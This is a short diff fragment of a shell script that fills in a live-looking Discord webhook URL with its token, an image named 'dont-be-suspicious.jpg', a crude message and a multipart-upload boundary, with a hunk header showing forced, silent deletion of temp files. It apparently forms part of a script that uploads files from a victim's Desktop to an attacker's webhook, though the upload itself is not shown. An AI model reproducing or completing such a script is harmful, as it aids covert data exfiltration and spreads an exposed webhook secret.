@@ -298,13 +298,13 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 cd ~/Desktop
 
 # Specify the Discord webhook URL
-WEBHOOK_URL="YOUR_DISCORD_WEBHOOK_URL"
+WEBHOOK_URL="https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
 
 # Specify the image file path
 IMAGE_PATH="dont-be-suspicious.jpg"
 
 # Set the message for the Discord content
-CONTENT="Your message goes here"
+CONTENT="brownies & downies"
 
 # Create a boundary string for the multipart/form-data
 BOUNDARY="------------------------$(date +%s)"
